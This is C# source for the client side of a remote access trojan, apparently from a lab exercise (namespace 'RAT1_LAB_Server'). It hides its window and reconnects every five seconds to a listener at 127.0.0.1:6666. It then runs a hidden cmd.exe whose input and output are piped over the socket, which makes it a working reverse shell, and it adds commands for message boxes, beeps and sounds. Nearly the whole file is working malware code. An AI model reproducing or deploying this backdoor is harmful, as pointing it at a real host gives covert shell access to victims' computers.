using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO; //for Streams
using System.Diagnostics;
using System.Threading; //for Process

namespace RAT1_LAB_Server
{
    public partial class Form1 : Form
    {
        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;

        public Form1()
        {
            InitializeComponent();
        }

       

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
            for (; ; )
            {
                RunServer();
                System.Threading.Thread.Sleep(5000); //Wait 5 seconds then try again
            }
        }

        private void RunServer()
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();

            if (!tcpClient.Connected)
            {
                try
                {
                    tcpClient.Connect("127.0.0.1", 6666);
                    networkStream = tcpClient.GetStream();
                    streamReader = new StreamReader(networkStream);
                    streamWriter = new StreamWriter(networkStream);
                }
                catch (Exception err) { return; } //if no Client don't continue

                processCmd = new Process();
                processCmd.StartInfo.FileName = "cmd.exe";
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.Start();
                processCmd.BeginOutputReadLine();
            }

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\n");
                    if (strInput.ToString().LastIndexOf("message") >= 0)
                    {
                       Thread th_message = new Thread(new ThreadStart(MessageCommand));
                        th_message.Start();
                    }
                    if (strInput.ToString().LastIndexOf("beep") >= 0)
                    {
                        Thread th_beep = new Thread(new ThreadStart(BeepCommand));
                        th_beep.Start();
                    }
                    if (strInput.ToString().LastIndexOf("sound") >= 0)
                    {
                        Thread th_sound = new Thread(new ThreadStart(PlaySoundCommand));
                        th_sound.Start();
                    }
                    if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer();
                    if (strInput.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();
                    processCmd.StandardInput.WriteLine(strInput);
                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception err)
                {
                    Cleanup();
                    break;
                }
            }//--end of while loop
        }//--end of RunServer()

        private void Cleanup()
        {
            try { processCmd.Kill(); }
            catch (Exception err) { };
            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }
        private void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }


        private void MessageCommand()
        {
            MessageBox.Show("Hello World");
        }
        private void BeepCommand()
        {
            Console.Beep(500, 2000);
        }
        private void PlaySoundCommand()
        {
            System.Media.SoundPlayer soundPlayer = new System.Media.SoundPlayer();
            soundPlayer.SoundLocation = @"C:\Windows\Media\chimes.wav";
            soundPlayer.Play();
        }
    }
}
